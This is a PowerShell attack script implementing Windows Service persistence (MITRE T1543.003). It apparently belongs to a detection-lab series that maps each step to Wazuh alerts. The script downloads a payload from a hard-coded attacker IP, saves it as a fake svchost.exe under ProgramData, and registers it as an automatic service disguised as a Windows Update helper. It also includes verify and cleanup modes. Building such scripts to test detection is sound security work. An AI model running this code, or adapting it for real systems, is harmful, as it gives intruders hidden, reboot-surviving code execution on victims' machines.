# =============================================================================
# persist_06_service.ps1 -- Windows Service Persistence [REQUIRES ADMIN]
# MITRE ATT&CK: T1543.003 - Create or Modify System Process: Windows Service
# =============================================================================
# Wazuh Detection:
#   - System EID 7045 (A new service was installed in the system)
#   - Sysmon EID 1 (Process Create) when service runs payload
#   - Wazuh Rule ID: 7036 (Wazuh built-in: new service installed)
# =============================================================================

param(
    [ValidateSet("install","test","remove")]
    [string]$Action = "install"
)

# ==============================================================================
# CONFIG
# ==============================================================================
$ATTACKER_IP  = "192.168.247.139"
$PAYLOAD_URL  = "http://${ATTACKER_IP}:9090/loader_garble.exe"
$PAYLOAD_PATH = "$env:ProgramData\Microsoft\Crypto\svchost.exe"

$SVC_NAME     = "WinUpdateSvc32"
$SVC_DISPLAY  = "Windows Update Service Helper"
$SVC_DESC     = "Provides infrastructure support for downloading and installing Windows updates."
$SVC_BIN      = $PAYLOAD_PATH
$SVC_START    = "Automatic"
# ==============================================================================

function Check-Admin {
    $currentPrincipal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Download-Payload {
    if (-not (Test-Path $PAYLOAD_PATH)) {
        Write-Host "[*] Downloading payload from $PAYLOAD_URL ..." -ForegroundColor Yellow
        try {
            Invoke-WebRequest -Uri $PAYLOAD_URL -OutFile $PAYLOAD_PATH -UseBasicParsing -ErrorAction Stop
            Write-Host "[+] Payload saved to: $PAYLOAD_PATH" -ForegroundColor Green
        } catch {
            Write-Warning "[!] Download failed. Creating dummy payload for testing..."
            Copy-Item "$env:SystemRoot\System32\notepad.exe" $PAYLOAD_PATH -Force -ErrorAction SilentlyContinue
        }
    } else {
        Write-Host "[*] Payload already exists at: $PAYLOAD_PATH" -ForegroundColor Cyan
    }
}

function Install-Persistence {
    Write-Host "`n[*] Installing Windows Service persistence..." -ForegroundColor Cyan

    if (-not (Check-Admin)) {
        Write-Error "[!] This technique requires Administrator privileges. Aborting."
        return $false
    }

    Download-Payload

    $existing = Get-Service -Name $SVC_NAME -ErrorAction SilentlyContinue
    if ($existing) {
        Write-Host "[!] Service already exists: $SVC_NAME. Removing first..." -ForegroundColor Yellow
        Stop-Service -Name $SVC_NAME -Force -ErrorAction SilentlyContinue
        sc.exe delete $SVC_NAME | Out-Null
        Start-Sleep -Seconds 2
    }

    try {
        # Create service -- System EID 7045 triggers here
        New-Service `
            -Name $SVC_NAME `
            -DisplayName $SVC_DISPLAY `
            -Description $SVC_DESC `
            -BinaryPathName $SVC_BIN `
            -StartupType $SVC_START `
            -ErrorAction Stop | Out-Null

        Write-Host "[+] Service created:" -ForegroundColor Green
        Write-Host "    Name       : $SVC_NAME" -ForegroundColor Gray
        Write-Host "    DisplayName: $SVC_DISPLAY" -ForegroundColor Gray
        Write-Host "    BinPath    : $SVC_BIN" -ForegroundColor Gray
        Write-Host "    StartupType: $SVC_START" -ForegroundColor Gray
        Write-Host "[+] Persistence installed. Service will run on next boot." -ForegroundColor Green
        Write-Host "[!] Note: payload must be a valid Windows service executable (calls SetServiceStatus)" -ForegroundColor Yellow
        return $true
    } catch {
        Write-Error "[!] Failed to create service: $_"
        return $false
    }
}

function Test-Persistence {
    Write-Host "`n[*] Verifying Windows Service persistence..." -ForegroundColor Cyan
    $ok = $true

    $svc = Get-Service -Name $SVC_NAME -ErrorAction SilentlyContinue
    if ($svc) {
        Write-Host "[+] Service EXISTS: $SVC_NAME" -ForegroundColor Green
        Write-Host "    Status : $($svc.Status)" -ForegroundColor Gray
        Write-Host "    StartType: $($svc.StartType)" -ForegroundColor Gray

        $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$SVC_NAME"
        if (Test-Path $regPath) {
            $binPath = (Get-ItemProperty $regPath).ImagePath
            Write-Host "    BinPath: $binPath" -ForegroundColor Gray
        }
    } else {
        Write-Host "[-] Service NOT found: $SVC_NAME" -ForegroundColor Red
        $ok = $false
    }

    if (Test-Path $PAYLOAD_PATH) {
        Write-Host "[+] Payload EXISTS: $PAYLOAD_PATH" -ForegroundColor Green
    } else {
        Write-Host "[-] Payload MISSING: $PAYLOAD_PATH" -ForegroundColor Red
        $ok = $false
    }

    if ($ok) { Write-Host "[RESULT] Persistence ACTIVE v" -ForegroundColor Green }
    else      { Write-Host "[RESULT] Persistence INCOMPLETE x" -ForegroundColor Red }
    return $ok
}

function Remove-Persistence {
    Write-Host "`n[*] Removing Windows Service persistence..." -ForegroundColor Cyan

    if (-not (Check-Admin)) {
        Write-Warning "[!] Admin required for full cleanup. Attempting anyway..."
    }

    $svc = Get-Service -Name $SVC_NAME -ErrorAction SilentlyContinue
    if ($svc) {
        Stop-Service -Name $SVC_NAME -Force -ErrorAction SilentlyContinue
        sc.exe delete $SVC_NAME | Out-Null
        Write-Host "[+] Service deleted: $SVC_NAME" -ForegroundColor Green
    } else {
        Write-Host "[-] Service not found (already removed?)" -ForegroundColor Yellow
    }

    if (Test-Path $PAYLOAD_PATH) {
        Remove-Item -Path $PAYLOAD_PATH -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Payload removed: $PAYLOAD_PATH" -ForegroundColor Green
    } else {
        Write-Host "[-] Payload not found (already removed?)" -ForegroundColor Yellow
    }
    Write-Host "[+] Cleanup complete." -ForegroundColor Green
}

# ==============================================================================
# Main Logic
# ==============================================================================
Write-Host "============================================================" -ForegroundColor Magenta
Write-Host " persist_06_service.ps1 -- T1543.003 Windows Service" -ForegroundColor Magenta
Write-Host " [REQUIRES ADMINISTRATOR]" -ForegroundColor Red
Write-Host " Wazuh: System EID 7045 (New service installed)" -ForegroundColor Magenta
Write-Host "============================================================" -ForegroundColor Magenta

switch ($Action) {
    "install" { Install-Persistence }
    "test"    { Test-Persistence }
    "remove"  { Remove-Persistence }
}
